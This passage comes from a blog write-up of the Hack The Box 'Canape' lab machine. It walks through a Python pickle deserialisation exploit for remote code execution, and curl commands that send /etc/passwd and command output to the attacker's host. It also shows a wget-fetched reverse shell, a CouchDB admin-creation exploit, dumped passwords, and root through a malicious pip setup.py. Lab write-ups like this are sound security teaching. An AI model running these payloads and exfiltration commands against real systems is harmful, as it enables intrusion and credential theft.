    <span class="nb">file</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">pickle_data</span><span class="p">)</span>
</pre></table></code></div></div><p>As the article said, when testing this locally, only Powned would be printed to the screen. I tried many combinations and functions, but nothing worked, I only got 500 Internal Errors. After many failed attempt, I concluded this process was time consuming and unsuccessful, for either I got the <code class="highlighter-rouge">Still reviewing: + content</code> message or the 500 error.</p><h2 id="exploit-20">Exploit 2.0</h2><p>I decided to automate everything with a python script so that I could try things easily and faster than before.</p><div class="language-py highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
</pre><td class="rouge-code"><pre>
<span class="kn">import</span> <span class="nn">pickle</span><span class="p">,</span> <span class="n">os</span><span class="p">,</span> <span class="n">sys</span>
<span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">md5</span>

<span class="k">class</span> <span class="nc">EvilPickle</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
	       <span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="s">'echo Powned'</span><span class="p">,</span> <span class="p">))</span>
<span class="n">pickle_data</span> <span class="o">=</span> <span class="n">pickle</span><span class="p">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">EvilPickle</span><span class="p">())</span>
<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"backup.p"</span><span class="p">,</span> <span class="s">"wb"</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
    <span class="k">print</span> <span class="s">"------------------------</span><span class="se">\n</span><span class="s">"</span>
    <span class="k">print</span> <span class="n">char</span> <span class="o">+</span> <span class="n">pickle_data</span>
    <span class="k">print</span> <span class="s">"------------------------</span><span class="se">\n</span><span class="s">"</span>
    <span class="nb">file</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">char</span> <span class="o">+</span> <span class="n">pickle_data</span><span class="p">)</span>
    <span class="nb">file</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>

<span class="n">WHITELIST</span> <span class="o">=</span> <span class="p">[</span>
    <span class="s">"homer"</span><span class="p">,</span>
    <span class="s">"marge"</span><span class="p">,</span>
    <span class="s">"bart"</span><span class="p">,</span>
    <span class="s">"lisa"</span><span class="p">,</span>
    <span class="s">"maggie"</span><span class="p">,</span>
    <span class="s">"moe"</span><span class="p">,</span>
    <span class="s">"carl"</span><span class="p">,</span>
    <span class="s">"krusty"</span>
<span class="p">]</span>

<span class="n">char</span> <span class="o">=</span> <span class="s">'Homerp1'</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"backup.p"</span><span class="p">,</span> <span class="s">"r"</span><span class="p">)</span> <span class="k">as</span> <span class="n">file2</span><span class="p">:</span>
	<span class="n">quote</span> <span class="o">=</span> <span class="n">pickle_data</span>
<span class="k">if</span> <span class="ow">not</span> <span class="n">char</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">quote</span><span class="p">:</span>
	<span class="k">print</span> <span class="s">"Error 1"</span>
	<span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">()</span>
<span class="k">elif</span> <span class="ow">not</span> <span class="nb">any</span><span class="p">(</span><span class="n">c</span><span class="p">.</span><span class="n">lower</span><span class="p">()</span> <span class="ow">in</span> <span class="n">char</span><span class="p">.</span><span class="n">lower</span><span class="p">()</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">WHITELIST</span><span class="p">):</span>
	<span class="k">print</span> <span class="s">"Error 2"</span>
	<span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">()</span>
<span class="n">data</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"backup.p"</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>
<span class="k">if</span> <span class="ow">not</span> <span class="s">"p1"</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
	<span class="k">print</span> <span class="s">"Error 3"</span>
	<span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">()</span>

<span class="k">else</span><span class="p">:</span>
	<span class="n">p_id</span> <span class="o">=</span> <span class="n">md5</span><span class="p">(</span><span class="n">char</span> <span class="o">+</span> <span class="n">quote</span><span class="p">).</span><span class="n">hexdigest</span><span class="p">()</span>
  <span class="k">print</span> <span class="n">p_id</span>

<span class="c1"># REQUESTS TO DO THE SUBMIT AND CHECK PART
</span>
<span class="kn">import</span> <span class="nn">requests</span>

<span class="n">url</span> <span class="o">=</span> <span class="s">"http://10.10.10.70/submit"</span>
<span class="n">data</span><span class="o">=</span> <span class="p">{</span>
	<span class="s">'character'</span><span class="p">:</span><span class="n">char</span><span class="p">,</span>
	<span class="s">'quote'</span><span class="p">:</span><span class="n">quote</span>
    <span class="p">}</span>
<span class="k">if</span> <span class="s">"Success"</span> <span class="ow">in</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">).</span><span class="n">text</span><span class="p">:</span>
	<span class="k">print</span> <span class="s">"Success posting data: {}, {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">char</span><span class="p">,</span> <span class="n">quote</span><span class="p">)</span>

<span class="n">url</span> <span class="o">=</span> <span class="s">"http://10.10.10.70/check"</span>
<span class="n">data</span><span class="o">=</span> <span class="p">{</span>
        <span class="s">'id'</span><span class="p">:</span> <span class="n">p_id</span>
    <span class="p">}</span>
<span class="k">print</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">).</span><span class="n">text</span>
</pre></table></code></div></div><p>This automated EVERYTHING!!</p><p>However, it wouldn’t work and the 500 Internal Error kept appearing… I was starting to get confused, this was the only method to exploit pickle I had found and it was not working…</p><p><em>Script not working</em></p><p><img src="/assets/posts_details/Canape/images/exp2.0.png" alt="Img" title="Img" /></p><p>That’s when I realized that I wasn’t actually unpacking the exploit code, but the <code class="highlighter-rouge">Homerp1</code> string + the exploit code! That’s why it wasn’t working and throwing an error. In fact, I tested it locally and that was the issue.</p><p>In order to keep the <code class="highlighter-rouge">Homer</code> string in the char variable I though about doing the following. First of all, I would add the string to the command run in the OS, but separated by a semicolon (as if they were two commands). That way, the first one would execute (the exploit), and the second result in an error. Besides, as the pickle exploit was several lines long, I could generate it, split it based on the newline characters (<code class="highlighter-rouge">\n</code>), then assign the first few lines (joined again with newlines) until the <code class="highlighter-rouge">Homer</code> string to the char variable and let the rest be the quote.</p><p>Translated in code…</p><div class="language-py highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="k">class</span> <span class="nc">EvilPickle</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
	       <span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="s">'echo Powned;homerp1'</span><span class="p">,</span> <span class="p">))</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">pickle</span><span class="p">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">EvilPickle</span><span class="p">())</span>
<span class="n">char</span> <span class="o">=</span> <span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">).</span><span class="n">join</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)[:</span><span class="mi">4</span><span class="p">])</span>
<span class="n">pickle_data</span> <span class="o">=</span> <span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">).</span><span class="n">join</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)[</span><span class="mi">4</span><span class="p">:])</span>
</pre></table></code></div></div><p>However, as I was still getting 500 errors, I thought about changing the exploit to somethin else, like a <code class="highlighter-rouge">ping</code>. Finally I got the following (I added the char before ‘cause it was always the same and the only thing that changed was my payload, so I could change it manually from the variable).</p><div class="language-py highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="n">char</span> <span class="o">=</span> <span class="s">"""cposix
system
p0
(S'ping -c 5 10.10.14.143;homerp1'
"""</span>

<span class="k">class</span> <span class="nc">EvilPickle</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
	       <span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="s">'ping -c 4 10.10.14.143;homerp1'</span><span class="p">,</span> <span class="p">))</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">pickle</span><span class="p">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">EvilPickle</span><span class="p">())</span>
<span class="n">pickle_data</span> <span class="o">=</span> <span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">).</span><span class="n">join</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)[</span><span class="mi">4</span><span class="p">:])</span>
</pre></table></code></div></div><p>What this command does is send 5 packets to my computer. That way I’ll know if the exploit works correctly in spite of the 500 error.</p><p>In order to listen in my local VM I used this command:</p><div class="highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>sudo tcpdump -itun0 icmp
</pre></table></code></div></div><p><em>Output from test</em></p><p><img src="/assets/posts_details/Canape/images/packets.png" alt="Img" title="Img" /></p><p>IT WORKS! Finally we got RCE! Now I had to figure out ways to exploit this vulnerability.</p><h2 id="getting-to-user---data-extraction">Getting to user - data extraction</h2><h3 id="pythons-simplehttpserver">Python’s SimpleHTTPServer</h3><p>First of all, it ocurred to me I could get data just by making curl requests to my computer with files that were outputs of commands:</p><p><em>Getting data from SimpleHTTPServer</em></p><p><img src="/assets/posts_details/Canape/images/simple_server_data.png" alt="Img" title="Img" /></p><p>Thanks to this method I found out that I was executing commands as <code class="highlighter-rouge">www-data</code> (meaning I couldn’t read the user flag) and that the user of the machine was <code class="highlighter-rouge">Homer</code>.</p><h3 id="curl-to-send-files">Curl to send files</h3><p>Then, I though about getting files, so I looked at curl and found a way to get these. Hence, I modified my script in order to execute the command I wanted:</p><div class="language-py highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="n">cmd</span> <span class="o">=</span> <span class="s">"curl --form 'fileupload=@/etc/passwd' 10.10.14.143:8001"</span>

<span class="n">char</span> <span class="o">=</span> <span class="s">"""cposix
system
p0
(S'{};homerp1'
"""</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
</pre></table></code></div></div><p>There was just one problem, I needed something in order to get the data from the POST request. I googled a bit and found a <a href="https://gist.github.com/kylemcdonald/3bb71e4b901c54073cbc">simple python server</a> that listened to these kind of requests:</p><p><em>Output from the curl POST command</em></p><p><img src="/assets/posts_details/Canape/images/etc_passwd.png" alt="Img" title="Img" /></p><p>Now I just needed something to get the output from commands that printed data in multiple lines, like <code class="highlighter-rouge">ls -al</code>.</p><h3 id="command--piped-output--curl-post">{Command} + Piped output + Curl POST</h3><p>I though I could pipe the command’s output to a file and then send the file to my machine with the previous method. The code was:</p><div class="language-py highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">cmd</span> <span class="o">=</span> <span class="s">"ls -al / &gt; /tmp/tmp1; curl --form 'filename=@/tmp/tmp1' 10.10.14.143:8001"</span>
</pre></table></code></div></div><p><em>List of the root directory</em></p><p><img src="/assets/posts_details/Canape/images/root_dir.png" alt="Img" title="Img" /></p><h3 id="getting-a-reverse-shell">Getting a reverse shell</h3><p>I grew tired of these methods and decided to get a shell (simple reverse shell from <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentestmonkey</a>):</p><ol><li>Get the code using wget and store the file in <code class="highlighter-rouge">/tmp</code> (where we have write permissions). I needed to do <code class="highlighter-rouge">which curl</code> to get the path of the executable, otherwise it wouldn’t work.</li></ol><div class="language-py highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">cmd</span> <span class="o">=</span> <span class="s">"cd /tmp; /usr/bin/wget 10.10.14.143:8002/shell.py;"</span>
</pre></table></code></div></div><ol><li>Listen on the local computer with <code class="highlighter-rouge">nc -lnvp {port}</code></li><li>Execute the reverse shell we uploaded with the RCE.</li></ol><div class="language-py highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">cmd</span> <span class="o">=</span> <span class="s">"cd /tmp; python shell.py;"</span>
</pre></table></code></div></div><p><em>Reverse shell spawned!</em></p><p><img src="/assets/posts_details/Canape/images/rev_shell.png" alt="Img" title="Img" /></p><p>Then, as we know python is installed, we can upgrade to a tty shell:</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>python <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
</pre></table></code></div></div><h3 id="getting-to-user">Getting to user</h3><p>The first thing that came to my mind was the CouchDB used by the web app. Maybe it had on it some creds?</p><p>I tried to get some data from it but always failed because I didn’t have an authorized user:</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="gp">www-data@canape:/tmp$</span><span class="w"> </span>curl <span class="nt">-s</span> http://localhost:5984/_users/_all_docs
<span class="go">curl -s http://localhost:5984/_users/_all_docs
{"error":"unauthorized","reason":"You are not a server admin."}
</span></pre></table></code></div></div><p>So I searched on the internet for ways to exploit the service, and found two python scripts that let me create an admin user. I tried with <a href="https://www.exploit-db.com/exploits/44913/">this</a> one and the following command:</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="gp">www-data@canape:/tmp$</span><span class="w"> </span>python ex.py <span class="nt">--priv</span> <span class="nt">-u</span> root3u <span class="nt">-p</span> password <span class="nt">-c</span> <span class="nb">whoami </span>http://127.0.0.1:5984
<span class="go">&lt;n ex.py --priv -u root3u -p password -c whoami http://127.0.0.1:5984        
[*] Detected CouchDB Version 2.0.0
[+] User root3u with password password successfully created.
[+] Created payload at: http://127.0.0.1:5984/_node/couchdb@localhost/_config/query_servers/cmd
[+] Command executed: whoami
[*] Cleaning up.
</span></pre></table></code></div></div><p>As it said that I needed to provide a command, I used <code class="highlighter-rouge">whoami</code>, which had a simple output. However, when I visied the url I still got unautorized access. After a few google searches, I learnt I needed to pass the user and password along with the URL, and this time I was authenticated. The only problem was the file didn’t exist.</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="gp">www-data@canape:/tmp$</span><span class="w"> </span>curl http://127.0.0.1:5984/_node/couchdb@localhost/_config/query_servers/cmd
<span class="go">&lt;http://127.0.0.1:5984/_node/couchdb@localhost/_config/query_servers/cmd     
{"error":"unauthorized","reason":"You are not a server admin."}
</span><span class="gp">www-data@canape:/tmp$</span><span class="w"> </span>http://root3u:password@127.0.0.1:5984/_node/couchdb@localhost/_config/query_servers/cmd
<span class="go">&lt;1:5984/_node/couchdb@localhost/_config/query_servers/cmd                    
bash: http://root3u:password@127.0.0.1:5984/_node/couchdb@localhost/_config/query_servers/cmd: No such file or directory
</span></pre></table></code></div></div><p>I went back to google and got a few interesting URLs to check:</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="gp">www-data@canape:/tmp$</span><span class="w"> </span>curl <span class="nt">-X</span> GET http://root3u:password@localhost:5984/simpsons/_all_docs
<span class="go">&lt;-X GET http://root3u:password@localhost:5984/simpsons/_all_docs             
{"total_rows":7,"offset":0,"rows":[
{"id":"f0042ac3dc4951b51f056467a1000dd9","key":"f0042ac3dc4951b51f056467a1000dd9","value":{"rev":"1-fbdd816a5b0db0f30cf1fc38e1a37329"}},
{"id":"f53679a526a868d44172c83a61000d86","key":"f53679a526a868d44172c83a61000d86","value":{"rev":"1-7b8ec9e1c3e29b2a826e3d14ea122f6e"}},
{"id":"f53679a526a868d44172c83a6100183d","key":"f53679a526a868d44172c83a6100183d","value":{"rev":"1-e522ebc6aca87013a89dd4b37b762bd3"}},
{"id":"f53679a526a868d44172c83a61002980","key":"f53679a526a868d44172c83a61002980","value":{"rev":"1-3bec18e3b8b2c41797ea9d61a01c7cdc"}},
{"id":"f53679a526a868d44172c83a61003068","key":"f53679a526a868d44172c83a61003068","value":{"rev":"1-3d2f7da6bd52442e4598f25cc2e84540"}},
{"id":"f53679a526a868d44172c83a61003a2a","key":"f53679a526a868d44172c83a61003a2a","value":{"rev":"1-4446bfc0826ed3d81c9115e450844fb4"}},
{"id":"f53679a526a868d44172c83a6100451b","key":"f53679a526a868d44172c83a6100451b","value":{"rev":"1-3f6141f3aba11da1d65ff0c13fe6fd39"}}
]}
</span></pre></table></code></div></div><p>I thought it was something useful, but it turned out they were quotes… So I decided to check on all the databases present:</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="gp">www-data@canape:/tmp$</span><span class="w"> </span>curl <span class="nt">-X</span> GET http://root3u:password@localhost:5984/_all_dbs          
<span class="go">&lt;-X GET http://root3u:password@localhost:5984/_all_dbs                       
["_global_changes","_metadata","_replicator","_users","passwords","simpsons"]
</span></pre></table></code></div></div><p>This is it! A database called <code class="highlighter-rouge">passwords</code>!</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="gp">www-data@canape:/tmp$</span><span class="w"> </span>curl <span class="nt">-X</span> GET http://root3u:password@localhost:5984/passwords/_all_docs
<span class="go">&lt;-X GET http://root3u:password@localhost:5984/passwords/_all_docs            
{"total_rows":4,"offset":0,"rows":[
{"id":"739c5ebdf3f7a001bebb8fc4380019e4","key":"739c5ebdf3f7a001bebb8fc4380019e4","value":{"rev":"2-81cf17b971d9229c54be92eeee723296"}},
{"id":"739c5ebdf3f7a001bebb8fc43800368d","key":"739c5ebdf3f7a001bebb8fc43800368d","value":{"rev":"2-43f8db6aa3b51643c9a0e21cacd92c6e"}},
{"id":"739c5ebdf3f7a001bebb8fc438003e5f","key":"739c5ebdf3f7a001bebb8fc438003e5f","value":{"rev":"1-77cd0af093b96943ecb42c2e5358fe61"}},
{"id":"739c5ebdf3f7a001bebb8fc438004738","key":"739c5ebdf3f7a001bebb8fc438004738","value":{"rev":"1-49a20010e64044ee7571b8c1b902cf8c"}}
]}
</span><span class="gp">www-data@canape:/tmp$</span><span class="w"> </span>curl <span class="nt">-X</span> GET http://root3u:password@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc438004738
<span class="go">&lt;ord@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc438004738               
{"_id":"739c5ebdf3f7a001bebb8fc438004738","_rev":"1-49a20010e64044ee7571b8c1b902cf8c","user":"homerj0121","item":"github","password":"STOP STORING YOUR PASSWORDS HERE -Admin"}
</span><span class="gp">www-data@canape:/tmp$</span><span class="w"> </span>curl <span class="nt">-X</span> GET http://root3u:password@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc43800368d
<span class="go">&lt;ord@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc43800368d               
{"_id":"739c5ebdf3f7a001bebb8fc43800368d","_rev":"2-43f8db6aa3b51643c9a0e21cacd92c6e","item":"couchdb","password":"r3lax0Nth3C0UCH","user":"couchy"}
</span><span class="gp">www-data@canape:/tmp$</span><span class="w"> </span>curl <span class="nt">-X</span> GET http://root3u:password@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc438003e5f
<span class="go">&lt;ord@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc438003e5f               
{"_id":"739c5ebdf3f7a001bebb8fc438003e5f","_rev":"1-77cd0af093b96943ecb42c2e5358fe61","item":"simpsonsfanclub.com","password":"h02ddjdj2k2k2","user":"homer"}
</span><span class="gp">www-data@canape:/tmp$</span><span class="w"> </span>curl <span class="nt">-X</span> GET http://root3u:password@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc4380019e4
<span class="go">&lt;ord@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc4380019e4               
{"_id":"739c5ebdf3f7a001bebb8fc4380019e4","_rev":"2-81cf17b971d9229c54be92eeee723296","item":"ssh","password":"0B4jyA0xtytZi7esBNGp","user":""}
</span></pre></table></code></div></div><p>I tried with that last password, as it said something about SSH and had no user, so I was curious. And voilà!! I was Homer!</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="gp">www-data@canape:/tmp$</span><span class="w"> </span>su homer
<span class="go">su homer
Password: 0B4jyA0xtytZi7esBNGp

</span><span class="gp">homer@canape:/tmp$</span><span class="w"> </span><span class="nb">cd</span> /home/homer   
<span class="go">cd /home/homer
</span><span class="gp">homer@canape:~$</span><span class="w"> </span><span class="nb">cat </span>user.txt
<span class="go">cat user.txt
bce918696f293e62b2321703bb27288d
</span></pre></table></code></div></div><h2 id="privilege-escalation">Privilege escalation</h2><p>Privilege escalation was much more straightforward than getting to user. As always, I check for sudo commands I can run:</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="gp">homer@canape:~$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="go">sudo -l
[sudo] password for homer: 0B4jyA0xtytZi7esBNGp

Matching Defaults entries for homer on canape:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User homer may run the following commands on canape:
    (root) /usr/bin/pip install *
</span></pre></table></code></div></div><p>Chara! Way to root found! I just had to google and find this <a href="https://github.com/0x00-0x00/FakePip">article</a> that explained how to get to root. However, I didn’t do it like that. Instead, I decided to do a <code class="highlighter-rouge">passwd</code> and set the root password to 1. The contents of my setup.py were:</p><div class="language-py highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">os</span>
<span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">'passwd'</span><span class="p">)</span>
</pre></table></code></div></div><p>I executed it and, as it looked as if it had hung, I tried typing in the 1, then again, and output came back! Later I figured out why this had happened: whenever you execute the command you’re asked to type the password and then re-type it, so that’s why I needed to type it twice.</p><p><em>Steps to get to root</em></p><p><img src="/assets/posts_details/Canape/images/root1.png" alt="Img" title="Img" /></p><p><img src="/assets/posts_details/Canape/images/root2.png" alt="Img" title="Img" /></p><hr /><p>And that was all! I hope you enjoyed reading and learnt a few things!</p><hr /><p><em>Diego Bernal Adelantado</em></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hack-the-box/'>Hack The Box</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/hack-the-box/" class="post-tag no-text-decoration" >Hack The Box</a> <a href="/tags/pentesting/" class="post-tag no-text-decoration" >Pentesting</a> <a href="/tags/couchdb/" class="post-tag no-text-decoration" >CouchDB</a> <a href="/tags/python/" class="post-tag no-text-decoration" >Python</a> <a href="/tags/pip/" class="post-tag no-text-decoration" >Pip</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><!-- Post sharing snippet v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hack The Box: Canape write-up - GoDiego&url=http://localhost:4000/posts/Canape/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hack The Box: Canape write-up - GoDiego&u=http://localhost:4000/posts/Canape/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hack The Box: Canape write-up - GoDiego&url=http://localhost:4000/posts/Canape/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=http://localhost:4000/posts/Canape/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank"> <i class="fa-fw fab fa-linkedin"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><!-- The Pannel on right side (Desktop views) v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><h3 data-toc-skip>Recent Update</h3><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Safe/">Hack The Box: Safe write-up</a></li><li><a href="/posts/Networked/">Hack The Box: Networked write-up</a></li><li><a href="/posts/Magic/">Hack The Box: Magic write-up</a></li><li><a href="/posts/Heist/">Hack The Box: Heist write-up</a></li><li><a href="/posts/Craft/">Hack The Box: Craft write-up</a></li></ul></div><div id="access-tags"><h3 data-toc-skip>Trending Tags</h3><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/sql/">SQL</a> <a class="post-tag" href="/tags/ssh/">SSH</a> <a class="post-tag" href="/tags/permissions/">Permissions</a> <a class="post-tag" href="/tags/php/">PHP</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/smb/">SMB</a> <a class="post-tag" href="/tags/john/">John</a> <a class="post-tag" href="/tags/file-upload/">File Upload</a> <a class="post-tag" href="/tags/rsa/">RSA</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h3 data-toc-skip class="pl-3 pt-2 mb-3">Contents</h3><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="post-extend-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <!-- Navigation buttons at the bottom of the post. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --><div class="post-navigation d-flex justify-content-between"> <a href="/posts/IceCTF-web/" class="btn btn-outline-primary"><p>IceCTF 2018: Web write-ups</p></a> <a href="/posts/Sunday/" class="btn btn-outline-primary"><p>Hack The Box: Sunday write-up</p></a></div><!-- The related posts of current post. Placed in the bottom of every single post. v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div id="related-posts" class="mt-4 mb-2 mb-sm-4 pb-2"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Admirer/"><div class="card-body"> <span class="timeago small"> Jun 3, 2020 <i class="unloaded">2020-06-03T00:00:00+02:00</i> </span><h3 